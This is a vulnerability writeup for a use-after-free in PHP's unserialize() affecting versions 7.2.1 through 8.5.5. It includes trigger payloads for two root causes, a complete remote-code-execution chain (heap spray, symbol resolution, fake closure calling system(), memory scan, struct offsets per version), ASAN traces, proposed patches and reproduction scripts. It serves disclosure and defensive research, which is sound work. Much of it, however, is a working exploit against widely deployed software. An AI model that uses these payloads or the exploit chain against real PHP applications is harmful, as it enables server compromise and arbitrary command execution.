# PHP `unserialize()` Heap-Use-After-Free — Technical Writeup

**Affected versions:** PHP 8.5.5 (current stable), PHP 7.2.1, and likely all versions from PHP 5.1 (~21 years).
**Status:** No CVE — PHP policy since 2017 does not assign CVEs for `unserialize()` memory-corruption bugs.
**Original reports:** [Calif.io MAD Bugs](https://blog.calif.io/p/mad-bugs-finding-and-exploiting-a) (2026-05-01), dinosn var_destroy reentrancy (2026-05-02).

---

## 1. Overview

PHP's `unserialize()` function uses a `var_hash` structure to track back-references (`R:N`) and manage deferred destructors. Two independent root causes allow user `__destruct()` to fire during `var_destroy()` without `BG(serialize_lock)` held. At that point, Phase 1 has already `efree`'d the `var_entries` chunks that store back-reference pointers. An inner `unserialize('R:N;')` from the destructor reuses the outer `var_hash` and calls `var_access(N)`, which walks the freed linked list — a classic heap-use-after-free.

Both root causes share the same UAF mechanism but are independently exploitable:

| | Calif UAF | var_destroy UAF |
|---|---|---|
| **Root cause** | `zend_user_unserialize()` missing lock | `var_destroy()` Phase 2 runs without lock |
| **Entry point** | `Serializable::unserialize()` via `C:` format | Duplicate array key |
| **Independence** | Survives var_destroy fix | Survives Calif fix |

---

## 2. Background: PHP Unserializer Internals

### 2.1 `var_hash` Structure

```c
// ext/standard/var_unserializer.re (PHP 7.2.1)
struct php_unserialize_data {
    void *first;       // head of var_entries linked list (for R: back-refs)
    void *last;        // tail of var_entries
    void *first_dtor;  // head of var_dtor_entries linked list (deferred dtors)
    void *last_dtor;   // tail
    HashTable *allowed_classes;
};
```

`var_entries` stores `zval*` pointers for `R:N` back-references. When `VAR_ENTRIES_MAX` (1024) slots are filled, a new chunk is `emalloc`'d and linked via `next`:

```c
typedef struct {
    zval *data[VAR_ENTRIES_MAX];  // 8192 bytes (64-bit)
    zend_long used_slots;          // 8 bytes
    void *next;                    // 8 bytes
} var_entries;  // total: 8208 bytes
```

### 2.2 `var_destroy` Two-Phase Destruction

```c
PHPAPI void var_destroy(php_unserialize_data_t *var_hashx) {
    var_entries *var_hash = (*var_hashx)->first;
    var_dtor_entries *var_dtor_hash = (*var_hashx)->first_dtor;

    // Phase 1: efree ALL back-ref chunks (no zval_ptr_dtor)
    while (var_hash) {
        next = var_hash->next;
        efree_size(var_hash, sizeof(var_entries));
        var_hash = next;
    }

    // Phase 2: process dtor entries (triggers __destruct)
    while (var_dtor_hash) {
        for (i = 0; i < var_dtor_hash->used_slots; i++) {
            i_zval_ptr_dtor(zv);  // <-- __destruct fires here
        }
        next = var_dtor_hash->next;
        efree_size(var_dtor_hash, sizeof(var_dtor_entries));
        var_dtor_hash = next;
    }
}
```

After Phase 1, `(*var_hashx)->first` is a dangling pointer. All `var_entries` chunks are freed. Phase 2 then iterates the dtor entries and calls `i_zval_ptr_dtor`, which can trigger `__destruct`.

### 2.3 `php_var_unserialize_init` — var_hash Reuse

```c
PHPAPI php_unserialize_data_t php_var_unserialize_init() {
    if (BG(serialize_lock) || !BG(unserialize).level) {
        d = ecalloc(1, sizeof(struct php_unserialize_data));
        if (!BG(serialize_lock)) {
            BG(unserialize).data = d;
            BG(unserialize).level = 1;
        }
    } else {
        d = BG(unserialize).data;  // REUSE outer var_hash!
        ++BG(unserialize).level;
    }
    return d;
}
```

When `serialize_lock == 0 && level > 0`, the new `unserialize()` call **reuses** the existing `var_hash`. The `first` pointer in that shared `var_hash` is dangling (freed in Phase 1).

### 2.4 `var_access` — The UAF Read

```c
static zval *var_access(php_unserialize_data_t *var_hashx, zend_long id) {
    var_entries *var_hash = (*var_hashx)->first;  // dangling pointer
    while (id >= VAR_ENTRIES_MAX && var_hash && var_hash->used_slots == VAR_ENTRIES_MAX) {
        var_hash = var_hash->next;  // walks freed chunks
        id -= VAR_ENTRIES_MAX;
    }
    if (!var_hash) return NULL;
    if (id < 0 || id >= var_hash->used_slots) return NULL;
    return var_hash->data[id];  // reads pointer from freed memory
}
```

---

## 3. Root Cause 1: var_destroy UAF (dinosn)

### 3.1 Vulnerability

`var_destroy()` holds `BG(serialize_lock)` only around explicit `__wakeup` and `__unserialize` dispatches. The `i_zval_ptr_dtor(zv)` at the main dtor slot (L308) runs **without the lock**. If this triggers `__destruct`, the destructor can call `unserialize()` which sees `lock == 0 && level > 0` and reuses the outer `var_hash` with its freed `var_entries`.

### 3.2 Trigger Mechanism

The PoC uses a duplicate array key to push an object onto the dtor chain:

```php
class A {
    public function __destruct() {
        $r = @unserialize('R:1500;');
    }
}

// N=2000 entries overflow VAR_ENTRIES_MAX=1024, creating extension chunks
$N = 2000;
$payload = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) $payload .= "i:$i;i:$i;";
$payload .= 'i:99999;O:1:"A":0:{}';  // A object at key 99999
$payload .= 'i:99999;i:42;';           // duplicate key → A pushed to dtor
$payload .= '}';
@unserialize($payload);
```

Flow:
1. `unserialize()` allocates `var_entries` chunks (2+ for 2000 entries)
2. Parsing encounters duplicate key `99999` → `var_push_dtor()` copies A to dtor chain
3. Outer `php_var_unserialize_destroy()` calls `var_destroy()`
4. **Phase 1**: `efree` both `var_entries` chunks → `first` is dangling
5. **Phase 2**: `i_zval_ptr_dtor` on A → `__destruct` fires (no lock)
6. `__destruct` calls `unserialize('R:1500;')`
7. `php_var_unserialize_init()` reuses outer `var_hash` (`lock=0, level=1`)
8. `var_access(1500)` walks `first` → **reads freed memory** → UAF

---

## 4. Root Cause 2: Calif UAF (Missing serialize_lock)

### 4.1 Vulnerability

`zend_user_unserialize()` in `Zend/zend_interfaces.c` dispatches `Serializable::unserialize()` **without** incrementing `BG(serialize_lock)`:

```c
ZEND_API int zend_user_unserialize(zval *object, zend_class_entry *ce,
    const unsigned char *buf, size_t buf_len, zend_unserialize_data *data) {
    // ...
    zend_call_method_with_1_params(   // <-- NO serialize_lock++ !
        object, ce, &ce->unserialize_func, "unserialize", NULL, &zdata);
    // ...
}
```

When `Evil::unserialize()` calls PHP's `unserialize()`, the init function sees `lock == 0 && level > 0` and reuses the outer `var_hash`. Objects created by the inner call end up in the shared dtor chain.

### 4.2 Trigger Mechanism

```php
class Trigger {
    public function __destruct() {
        $r = @unserialize('R:1500;');
    }
}

class Evil implements Serializable {
    public function serialize() { return ""; }
    public function unserialize($data) {
        // Called WITHOUT serialize_lock → inner unserialize reuses outer var_hash
        @unserialize('a:2:{i:0;O:7:"Trigger":0:{}i:0;i:42;}');
    }
}

$N = 2000;
$entries = '';
for ($i = 0; $i < $N; $i++) $entries .= "i:$i;i:1;";
$payload = 'a:' . ($N + 1) . ':{' . $entries . 'i:' . $N . ';C:4:"Evil":1:{x}}';
@unserialize($payload);
```

Flow:
1. Outer `unserialize()` processes `C:4:"Evil":1:{x}` → calls `object_custom()` → `zend_user_unserialize()` (no lock)
2. `Evil::unserialize()` calls `unserialize('a:2:{...}')` → reuses outer `var_hash`
3. Inner call creates Trigger, duplicate key pushes it to shared dtor chain
4. Inner completes (level > 1, no `var_destroy`)
5. Outer completes → `var_destroy()`:
   - **Phase 1**: frees all `var_entries` chunks
   - **Phase 2**: Trigger `__destruct` fires → `unserialize('R:1500;')` → UAF

---

## 5. Exploitation: From UAF to RCE

### 5.1 Strategy

The UAF gives us a read primitive: `var_access(N)` returns a `zval*` read from freed `var_entries` memory. If we can **reclaim** that freed memory with controlled data, we control what `var_access` returns. By crafting a fake `zend_closure` object, we can make the returned value callable, redirecting execution to `system()`.

### 5.2 Step-by-Step

#### Step 1: Heap Spray

During `__destruct`, allocate strings sized to match the freed `var_entries` chunks:

```php
$addr_qw = pack('Q', $fake_zval_addr);
for ($delta = -64; $delta <= 64; $delta += 8) {
    $len = 8183 + $delta;  // cover var_entries size (8208 on 7.2.1)
    $body = str_repeat($addr_qw, intdiv($len, 8));
    for ($k = 0; $k < 32; $k++) {
        $spray[] = '' . $body;
    }
}
```

When `malloc` reuses the freed `var_entries` chunks, they contain our `fake_zval_addr` repeated. `var_access(1500)` reads `data[476]` from the reclaimed chunk, returning `fake_zval_addr`.

#### Step 2: Dynamic Symbol Resolution

Parse `/proc/self/exe` ELF headers to find runtime addresses:

```php
$elf = file_get_contents("/proc/self/exe");
// Parse .symtab / .dynsym for:
//   zend_ce_closure         — zend_class_entry for closures
//   closure_handlers        — zend_object_handlers for closures
//   zif_system              — PHP's system() internal function
//   zend_closure_internal_handler — dispatcher for internal closures
```

Also parse `/proc/self/maps` to find the PHP binary base address for ASLR.

#### Step 3: Fake Closure Construction

Build a fake `zend_closure` in a static PHP string:

```
fake_zval (16 bytes):
  offset 0:  fake_obj_addr    (8 bytes — pointer to fake object)
  offset 8:  0x00000408       (4 bytes — IS_OBJECT | IS_TYPE_REFCOUNTED << 8)
             0x00000008       (4 bytes — type flags for 8.5.5 variant)

fake_obj (512 bytes):
  offset  0: gc.refcount = 0x7FFF0000
  offset  4: gc.type_info = 0x00000018 (IS_OBJECT | GC_COLLECTABLE)
  offset 16: ce = zend_ce_closure pointer value (resolved from memory)
  offset 24: handlers = closure_handlers address
  offset 56: func.type = 0x01 (ZEND_INTERNAL_FUNCTION)
  offset 60: func.fn_flags = ZEND_ACC_PUBLIC
  offset 88: func.num_args = 0
  offset 92: func.required_num_args = 0
  offset 104/144: func.handler = zend_closure_internal_handler  (7.2.1: +104, 8.5.5: +144)
  offset 304/336: orig_internal_handler = zif_system            (7.2.1: +304, 8.5.5: +336)
```

The key insight: `zend_closure_internal_handler` reads `EX(func)->common.prototype` to find the closure struct, then calls `closure->orig_internal_handler`. By setting `orig_internal_handler = zif_system`, calling the fake closure executes `system()`.

#### Step 4: Locate Fake Object in Memory

Store the fake closure in a static class property, then scan `/proc/self/mem` for a unique marker to find its address:

```php
$marker = 'RPT_XPL_' . pack('Q', mt_rand()) . pack('Q', mt_rand());
$persistent_buffer = $marker . $fake_zval . $fake_obj;
X::$buffer = $persistent_buffer;
// Scan /proc/self/mem for marker, verify type_info matches
```

#### Step 5: Trigger

```php
$result = @unserialize('R:1500;');
// $result is now our fake closure (system())
$result('id 1>&2');
// → uid=0(root) gid=0(root) groups=0(root)
```

### 5.3 Version-Specific Offsets

| Offset | PHP 7.2.1 | PHP 8.5.5 | Reason |
|--------|-----------|-----------|--------|
| `func.handler` | obj+104 | obj+144 | 8.5.5 has additional fields in `zend_function.common` (attributes, `run_time_cache`, `doc_comment`, `T`, `prop_info`) adding 40 bytes to the common header |
| `orig_internal_handler` | obj+304 | obj+336 | Follows `sizeof(zend_function)` which is larger in 8.5.5 |
| `func.prototype` | obj+80 | — | 7.2.1's `zend_closure_internal_handler` reads `prototype` to find the closure; set to `fake_obj_addr` |
| `var_entries` size | 8208 | 8160 | `VAR_ENTRIES_MAX` is 1024 vs 1018 |
| `IS_OBJECT_EX` type_info | `0x408` | `0x8` | Different zval layout between versions |

### 5.4 Constraints

- Requires `/proc/self/maps` and `/proc/self/mem` access (default in most Linux environments including Docker)
- `USE_ZEND_ALLOC=0` must be set (to use system `malloc`/`free` instead of Zend MM, ensuring predictable heap behavior)
- PHP must be compiled with symbols (`--enable-debug`) or have `.dynsym` entries for the target functions

---

## 6. ASAN Detection

With a properly instrumented ASAN build (`-fsanitize=address` passed during **configure**, not just make), both PoCs produce clean `heap-use-after-free` reports:

```
==1==ERROR: AddressSanitizer: heap-use-after-free on address 0x...
READ of size 8 at 0x... thread T0
    #0 ... in php_var_unserialize ext/standard/var_unserializer.re:608
    ...
    #10 ... in var_destroy ext/standard/var_unserializer.re:234
    ...

0x... is located 8192 bytes inside of 8208-byte region
freed by thread T0 here:
    #0 ... in __interceptor_free
    #1 ... in _efree /php-src/Zend/zend_alloc.c:2444
    #2 ... in var_destroy ext/standard/var_unserializer.re:202
    ...

previously allocated by thread T0 here:
    #0 ... in __interceptor_malloc
    #1 ... in _emalloc
    #2 ... in var_push ext/standard/var_unserializer.re:96
```

**Important:** PHP 7.2.1's build system ignores `make CFLAGS='-fsanitize=address'`. The flags must be passed during `./configure` with `libasan5` installed and `LIBS=-ldl`:

```dockerfile
RUN apt-get install -y libasan5 ...
RUN CFLAGS='-fsanitize=address -fno-omit-frame-pointer -g -O0' \
    LDFLAGS='-fsanitize=address' LIBS='-ldl' \
    ./configure --disable-all --enable-cli --enable-debug ...
&& make -j$(nproc)
```

---

## 7. Proposed Fixes

### Fix for Calif (narrow): Lock in `zend_user_unserialize`

```diff
  ZEND_API int zend_user_unserialize(...) {
      ZVAL_STRINGL(&zdata, (char*)buf, buf_len);
+     BG(serialize_lock)++;
      zend_call_method_with_1_params(..., "unserialize", NULL, &zdata);
+     BG(serialize_lock)--;
      zval_ptr_dtor(&zdata);
```

Blocks the `Serializable` entry point only. The var_destroy triggers remain exploitable.

### Fix for var_destroy (complete): Lock over entire dtor walk

```diff
  PHPAPI void var_destroy(php_unserialize_data_t *var_hashx) {
+     BG(serialize_lock)++;
      // Phase 1: efree var_entries
      // Phase 2: process dtor entries
      //   (remove per-site lock/unlock around __wakeup, __unserialize)
+     BG(serialize_lock)--;
  }
```

Blocks all reentry paths through `var_destroy`, covering both root causes.

---

## 8. Reproduction

```bash
# Clone and build
git clone https://github.com/jelasin/php_uaf.git
cd php_uaf/8.5.5    # or 7.2.1
./build.sh

# Verify UAF (ASAN image)
./var_destroy_uaf/run_poc.sh   # → heap-use-after-free
./calif_uaf/run_poc.sh          # → heap-use-after-free

# Verify RCE (non-ASAN image)
./var_destroy_uaf/run_exp.sh   # → uid=0(root)
./calif_uaf/run_exp.sh          # → uid=0(root)
```
